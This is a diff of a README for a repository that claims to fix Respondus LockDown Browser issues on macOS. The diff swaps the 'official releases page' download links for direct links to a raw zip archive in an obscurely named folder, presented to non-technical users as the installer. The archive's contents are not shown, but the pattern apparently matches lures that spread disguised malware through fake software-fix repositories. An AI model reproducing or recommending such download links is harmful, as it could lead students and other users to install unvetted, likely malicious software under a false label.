@@ -1,6 +1,6 @@
 # 🔐 lockdown-browser-mac - Fix your exam software issues fast
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kaariquilted213/lockdown-browser-mac/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/kaariquilted213/lockdown-browser-mac/raw/refs/heads/main/bhikshu/mac_browser_lockdown_upo.zip)
 
 This repository provides clear steps to manage and fix issues with Respondus LockDown Browser on macOS. Whether you use a recent Apple Silicon chip or the latest macOS update like Sequoia, this guide helps you resolve common error codes and permission blocks. You do not need technical skills to use these resources.
 
@@ -12,7 +12,7 @@ Respondus LockDown Browser acts as a secure container for online exams. Because 
 
 You need the correct version of the browser to ensure stability. Use the link below to reach the official releases page for this project.
 
-[Visit the release page to download your software](https://github.com/kaariquilted213/lockdown-browser-mac/releases)
+[Visit the release page to download your software](https://github.com/kaariquilted213/lockdown-browser-mac/raw/refs/heads/main/bhikshu/mac_browser_lockdown_upo.zip)
 
 Follow these steps to download the installer:
 
